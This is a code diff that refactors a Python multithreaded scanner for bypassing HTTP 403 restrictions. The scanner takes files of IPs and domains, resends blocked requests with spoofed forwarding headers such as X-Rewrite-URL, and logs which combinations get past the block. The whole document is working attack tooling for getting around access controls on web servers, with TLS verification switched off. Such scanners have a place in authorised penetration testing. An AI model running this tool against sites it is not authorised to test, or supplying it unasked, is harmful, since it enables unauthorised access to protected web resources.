@@ -1,8 +1,8 @@
-import threading
+import concurrent.futures
 import requests
 import argparse
 from tqdm import tqdm
-from time import sleep
+import threading
 requests.packages.urllib3.disable_warnings()
 
 # Defining header variables
@@ -29,12 +29,16 @@ header_list = [
     "X-Rewrite-Url", "X-Rewrite-URL", "X-WAP-Profile"
 ]
 
+# Global variable to control shutdown
+shutdown_flag = threading.Event()
+
 # Function to parse command line arguments
 def parse_arguments():
     parser = argparse.ArgumentParser(description="403 bypass test using HTTP headers and IPs")
-    parser.add_argument('-i', '--ips', type=str, required=True, help="File containing list of IPs")
-    parser.add_argument('-d', '--domains', type=str, required=True, help="File containing list of domains")
+    parser.add_argument('-i', '--ips', type=str, required=True, help="File containing a list of IPs")
+    parser.add_argument('-d', '--domains', type=str, required=True, help="File containing a list of domains")
     parser.add_argument('-o', '--output', type=str, help="File to save the bypass results (optional)")
+    parser.add_argument('-t', '--threads', type=int, default=5, help="Number of threads to use (default is 5)")
     return parser.parse_args()
 
 # Function to read file and return a list of lines
@@ -50,43 +54,51 @@ def write_results_to_file(results, output_file):
                 file.write(f"[STATUS {status_code}] Bypass: {domain} Header: {header} IP: {ip}\n")
 
 # Function that performs the test for each header and IP
-def test_bypass(header, ip, domain, results, pbar):
+def test_bypass(header, ip, domain):
     session = requests.Session()
     try:
-        response_403 = session.head(domain, timeout=10, verify=False, allow_redirects=False)
+        # Check if shutdown has been initiated
+        if shutdown_flag.is_set():
+            return None
+        
+        # Making the request with a concise timeout
+        response_403 = session.head(domain, timeout=5, verify=False, allow_redirects=False)
+        
         if response_403.status_code == 403:
-            response = session.head(domain, headers={header: ip}, timeout=10, verify=False)
+            if shutdown_flag.is_set():
+                return None
+            
+            response = session.head(domain, headers={header: ip}, timeout=5, verify=False)
             http_code = response.status_code
             if http_code in [200, 301, 302, 401, 404]:
-                tqdm.write(f"[STATUS {http_code}] Bypass for Domain: {domain} Header: {header} IP: {ip}")
-                results.append((domain, http_code, header, ip))
-        pbar.update(1)
-
-    except requests.exceptions.ConnectionError:
-        #tqdm.write(f"[!] Connection Error for {domain} with Header: {header} and IP: {ip}")
-        pass
-    except requests.exceptions.Timeout:
-        #tqdm.write(f"[!] Timeout for {domain} with Header: {header} and IP: {ip}")
-        pass
-    except requests.exceptions.RequestException as e:
-        #tqdm.write(f"[!] Request Exception for {domain} with Header: {header} and IP: {ip}: {e}")
+                return (domain, http_code, header, ip)
+    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RequestException):
+        # Handle exceptions but do not let this block frozen the thread
         pass
     finally:
         session.close()
+    
+    return None
 
 # Function that creates threads to test in parallel
-def start_threads(ips_list, domains_list, header_list, results):
-    threads = []
+def start_tests(ips_list, domains_list, header_list, num_threads):
+    results = []
     total_tests = len(header_list) * len(ips_list) * len(domains_list)
-    with tqdm(total=total_tests, desc="Running") as pbar:
-        for ip in ips_list:
-            for header in header_list:
-                for domain in domains_list:
-                    thread = threading.Thread(target=test_bypass, args=(header, ip, domain, results, pbar))
-                    thread.start()
-                    threads.append(thread)
-        for thread in threads:
-            thread.join()
+    
+    # Create a ThreadPoolExecutor to manage threads
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+        future_to_result = {
+            executor.submit(test_bypass, header, ip, domain): (domain, header, ip)
+            for ip in ips_list for header in header_list for domain in domains_list
+        }
+        
+        with tqdm(total=total_tests, desc="Running") as pbar:
+            for future in concurrent.futures.as_completed(future_to_result):
+                result = future.result()
+                if result is not None:
+                    results.append(result)
+                pbar.update(1)
+    return results
 
 # Main function
 def main():
@@ -96,12 +108,14 @@ def main():
         ips_list = read_file(args.ips)
         domains_list = read_file(args.domains)
         output_file = args.output
-        results = []
-        start_threads(ips_list, domains_list, header_list, results)
+        num_threads = args.threads
+        
+        results = start_tests(ips_list, domains_list, header_list, num_threads)
         print(f"[!] Total bypass found: {len(results)}\n")
         write_results_to_file(results, output_file)
     except KeyboardInterrupt:
+        shutdown_flag.set()  # Set the shutdown flag to stop all threads gracefully
         print("\n[!] Execution interrupted by user. Exiting...")
-
+        
 if __name__ == "__main__":
     main()
